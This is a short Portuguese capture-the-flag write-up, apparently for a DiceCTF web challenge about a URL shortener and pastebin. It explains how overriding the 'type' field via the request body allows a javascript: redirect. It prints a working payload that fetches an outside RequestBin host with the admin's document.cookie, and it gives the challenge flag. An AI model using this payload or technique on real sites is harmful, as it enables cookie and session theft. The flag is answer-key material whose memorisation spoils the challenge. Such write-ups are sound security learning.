@@ -1,0 +1,9 @@
+Dá pra controlar o valor de type tanto na url-shorter quanto na pastebin. database.addData({ type: 'paste', ...req.body, uid }); se …req.body contiver ‘type’, dá pra colocar qualquer coisa. assim dá pra criar o tipo ‘link’ sem precisar começar com http
+
+Estou achando que é esse o caminho mesmo. Ao trocar o “type” de um Paste para “link”, é possível dar bypass no RegEx do “https://”. Quando vamos para a página de view (/view/:uid), o document.location é substituído pelo dado (parâmetro “data”) que nós passamos. Por exemplo, se ao enviar a requisição para /api/createPaste, passamos no corpo {"data":"<nosso+payload>", "type":"link"}, ele será salvo como “link” no BD. Ao dar um /view/id_que_obtivemos, document.location vira “<nosso+payload>” (em view.html, temos: if (type === 'link') return window.location = data;)
+
+Realmente, era esse o caminho. Lembrei que um “protocolo” válido é javascript:, portanto, fiz uma requisição para /api/createPaste com o seguinte corpo: {"data":"javascript:fetch('https://ensyyniflu29.x.pipedream.net/?pwn=A'+document.cookie)", "type":"link"}.
+
+Enviei o link que obtive do createPaste para o admin. Quando ele manda a requisição para /view/<id_do_meu_paste>, ele recebe o view.html. Essa página executa um script que ao identificar que os dados recebidos do BD tem um type = 'link', o código if (type === 'link') return window.location = data; é executado e o admin é redirecionado para javascript:fetch('https://ensyyniflu29.x.pipedream.net/?pwn=A'+document.cookie), dando um fetch no RequestBin que eu criei e me mandando os cookies dele.
+
+**Flag: dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}**
